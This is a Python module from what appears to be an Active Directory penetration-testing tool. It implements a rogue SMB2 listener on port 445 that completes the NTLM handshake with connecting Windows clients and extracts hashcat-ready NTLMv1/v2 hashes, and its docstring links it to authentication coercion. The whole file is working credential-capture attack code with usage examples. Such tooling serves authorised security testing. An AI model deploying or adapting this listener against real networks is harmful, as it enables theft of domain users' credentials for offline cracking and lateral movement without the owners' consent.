"""Async SMB2 server that captures NTLMv1/v2 hashes without a relay target.

Used by any ADscan flow that needs to listen on port 445 and capture the NTLM
authentication from an incoming connection (e.g. active coercion, hash-grabbing
from triggered credentials) without relaying to a downstream target.

Architecture
------------
``SMBRelayServer`` (aiosmb) accepts connections and calls
``gssapi.authenticate_relay_server()`` on the per-connection GSSAPI object.
``_SPNEGOCaptureAdapter`` wraps asyauth's standalone ``SPNEGOserver`` +
``NTLMServerNative`` so the server generates its own NTLM challenge and
completes the full Negotiate → Challenge → Authenticate handshake locally.
Once the Authenticate message arrives, the completed GSSAPI context is put
into ``capture_queue`` and ``extract_ntlm_hash`` turns it into a
``NtlmCaptureResult``.

Comparison with ``SMBKrbCaptureListener`` (smb_krb_capture.py)
---------------------------------------------------------------
Both modules expose the same async ``start() / stop()`` interface and accept
an ``asyncio.Queue``.  The Kerberos listener uses the bare ``SMBServer`` (no
relay machinery) and captures a raw SPNEGO blob; this module uses
``SMBRelayServer`` and captures a hashcat-format NTLM hash.

Usage
-----
::

    from adscan_internal.services.relay.smb_ntlm_capture import (
        SMBNtlmCaptureConfig,
        SMBNtlmCaptureSource,
        NtlmCaptureResult,
        extract_ntlm_hash,
    )

    queue: asyncio.Queue[object] = asyncio.Queue()
    config = SMBNtlmCaptureConfig(listen_host="192.168.1.5", listen_port=445)
    source = SMBNtlmCaptureSource(config, queue)
    await source.start()
    try:
        gssapi = await asyncio.wait_for(queue.get(), timeout=60.0)
        result = extract_ntlm_hash(gssapi)
        if result:
            print(result.fullhash)   # hashcat-ready string
    finally:
        await source.stop()
"""

from __future__ import annotations

import asyncio
import contextlib
from dataclasses import dataclass
from typing import Any

from adscan_internal.rich_output import print_info_debug


# ---------------------------------------------------------------------------
# Public result type
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class NtlmCaptureResult:
    """An NTLM credential captured from a completed SMB SESSION_SETUP exchange."""

    fullhash: str
    ntlm_version: str   # "NTLMv1" or "NTLMv2"
    username: str | None
    domain: str | None


# ---------------------------------------------------------------------------
# GSSAPI adapter — bridges relay server API to standalone SPNEGOserver
# ---------------------------------------------------------------------------

class _SPNEGOCaptureAdapter:
    """Wraps asyauth ``SPNEGOserver`` to expose the ``SMBRelayServer`` GSSAPI API.

    ``SMBRelayServer`` calls ``authenticate_relay_server()`` on each per-connection
    GSSAPI object.  The standalone ``SPNEGOserver`` only exposes
    ``authenticate_server()``.  This adapter delegates and puts the completed
    GSSAPI context into ``_capture_queue`` once ``to_continue`` is ``False``.
    """

    def __init__(self, capture_queue: asyncio.Queue[object], inner: object) -> None:
        self._inner = inner
        self._capture_queue = capture_queue

    def set_connection_info(self, connection: Any) -> None:
        self._inner.set_connection_info(connection)

    def get_mechtypes_list(self) -> bytes:
        return self._inner.get_mechtypes_list()

    async def authenticate_relay_server(
        self,
        token: bytes,
        *args: object,
        **kwargs: object,
    ) -> tuple[bytes | None, bool, Exception | None]:
        result, to_continue, err = await self._inner.authenticate_server(
            token, *args, **kwargs
        )
        if not to_continue and err is None:
            await self._capture_queue.put(self._inner)
        return result, to_continue, err

    async def authenticate_relay_server_finished(self) -> tuple[bytes, None]:
        return await self._inner.authenticate_server_finished()

    def get_session_key(self) -> bytes:
        return self._inner.get_session_key()


# ---------------------------------------------------------------------------
# Hash extraction
# ---------------------------------------------------------------------------

def extract_ntlm_hash(gssapi: object) -> NtlmCaptureResult | None:
    """Extract a hashcat-format NTLM hash from a completed ``SPNEGOserver`` context.

    Returns ``None`` if the exchange is not yet complete or cannot be parsed.
    """
    ntlm = None
    if hasattr(gssapi, "get_ntlm"):
        ntlm = gssapi.get_ntlm()
    if ntlm is None and hasattr(gssapi, "selected_authentication_context_server"):
        ntlm = gssapi.selected_authentication_context_server

    negotiate = getattr(ntlm, "ntlmNegotiate", None)
    challenge = getattr(ntlm, "ntlmChallenge", None)
    authenticate = getattr(ntlm, "ntlmAuthenticate", None)

    if negotiate is None or challenge is None or authenticate is None:
        return None

    try:
        from badauth.protocols.ntlm.creds_calc import NTLMCredentials  # noqa: PLC0415

        creds_list = NTLMCredentials.construct(negotiate, challenge, authenticate)
    except Exception:  # noqa: BLE001
        return None

    if not creds_list:
        return None

    cred = creds_list[0]
    ctype = str(getattr(cred, "ctype", "") or "").lower()
    if "v2" in ctype:
        version = "NTLMv2"
    elif "v1" in ctype or "ntlm" in ctype:
        version = "NTLMv1"
    else:
        return None

    fullhash = getattr(cred, "fullhash", None)
    if not fullhash:
        return None

    return NtlmCaptureResult(
        fullhash=fullhash,
        ntlm_version=version,
        username=getattr(cred, "username", None),
        domain=getattr(cred, "domain", None),
    )


# ---------------------------------------------------------------------------
# Listener
# ---------------------------------------------------------------------------

@dataclass(frozen=True)
class SMBNtlmCaptureConfig:
    """Configuration for the standalone NTLM capture SMB listener."""

    listen_host: str = "0.0.0.0"
    listen_port: int = 445


class SMBNtlmCaptureSource:
    """Async SMB2 server that captures NTLMv1/v2 hashes without a relay target.

    Mirrors the ``SMBKrbCaptureListener`` interface: async ``start()`` /
    ``stop()`` with a caller-supplied ``asyncio.Queue``.

    Usage::

        queue: asyncio.Queue[object] = asyncio.Queue()
        source = SMBNtlmCaptureSource(
            SMBNtlmCaptureConfig(listen_host="192.168.1.5"),
            queue,
        )
        await source.start()
        try:
            gssapi = await asyncio.wait_for(queue.get(), timeout=60.0)
            result = extract_ntlm_hash(gssapi)
        finally:
            await source.stop()
    """

    def __init__(
        self,
        config: SMBNtlmCaptureConfig,
        capture_queue: asyncio.Queue[object],
    ) -> None:
        self._config = config
        self._capture_queue = capture_queue
        self._server_task: asyncio.Task[object] | None = None
        self._server: object = None

    async def start(self) -> None:
        """Start the SMB capture listener.  Raises on bind failure."""
        from badauth.protocols.ntlm.server.native import NTLMServerNative  # noqa: PLC0415
        from badauth.protocols.spnego.server.native import SPNEGOserver  # noqa: PLC0415
        from badauth.common.credentials.ntlm import NTLMCredential  # noqa: PLC0415
        from badauth.common.constants import asyauthSecret  # noqa: PLC0415
        from asysocks.unicomm.common.target import UniProto, UniTarget  # noqa: PLC0415
        from aiosmb.protocol.smb2.commands.negotiate import NegotiateDialects  # noqa: PLC0415
        from aiosmb.relay.server import SMBRelayServer, SMBServerSettings  # noqa: PLC0415
        from aiosmb.wintypes.dtyp.constrcuted_security.guid import GUID  # noqa: PLC0415

        capture_queue = self._capture_queue

        def _make_gssapi() -> _SPNEGOCaptureAdapter:
            cred = NTLMCredential(
                secret="",
                username="",
                domain="",
                stype=asyauthSecret.PASSWORD,
            )
            ntlm_server = NTLMServerNative(cred)
            inner = SPNEGOserver(capture_queue)
            inner.add_auth_context(
                "NTLMSSP - Microsoft NTLM Security Support Provider", ntlm_server
            )
            return _SPNEGOCaptureAdapter(capture_queue, inner)

        target = UniTarget(
            self._config.listen_host, self._config.listen_port, UniProto.SERVER_TCP
        )
        from adscan_internal.services.native_log_taming import make_relay_log_callback  # noqa: PLC0415
        settings = SMBServerSettings(_make_gssapi, log_callback=make_relay_log_callback("smb-ntlm-capture"))  # pylint: disable=unexpected-keyword-arg
        settings.preferred_dialects = [NegotiateDialects.SMB202]
        settings.ServerGuid = GUID.random()
        settings.RequireSigning = False
        settings.shares = {}

        self._server = SMBRelayServer(target, settings)
        task, err = await self._server.run()
        if err is not None:
            raise RuntimeError(
                f"SMB NTLM capture listener failed to start on "
                f"{self._config.listen_host}:{self._config.listen_port}: {err}"
            )
        self._server_task = task
        print_info_debug(
            f"[smb-ntlm-capture] listener ready — "
            f"{self._config.listen_host}:{self._config.listen_port}"
        )

    async def stop(self) -> None:
        """Stop the SMB capture listener."""
        if self._server_task is not None:
            self._server_task.cancel()
            with contextlib.suppress(asyncio.CancelledError, Exception):
                await self._server_task
            self._server_task = None
